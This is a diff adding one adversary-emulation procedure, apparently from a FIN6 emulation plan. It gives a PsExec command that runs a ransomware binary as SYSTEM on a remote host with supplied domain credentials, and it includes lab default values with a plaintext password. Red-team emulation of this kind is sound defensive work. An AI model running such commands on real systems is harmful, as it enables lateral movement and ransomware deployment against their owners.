@@ -1,0 +1,32 @@
+- id: d77838f6-d562-3480-ad29-2cbeee8b7b45
+  name: Execute Ransomware via PsExec
+  description: FIN6 has utilized PsExec to execute ransomeware on intended targets
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_psexec
+  procedure_step: 7.3.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 172.18.39.6
+    domain_user:
+      description: Domain and username
+      type: string
+      default: ctid\pgustavo
+    password:
+      description: Valid Password
+      type: string
+      default: 'W1n1!2019'
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
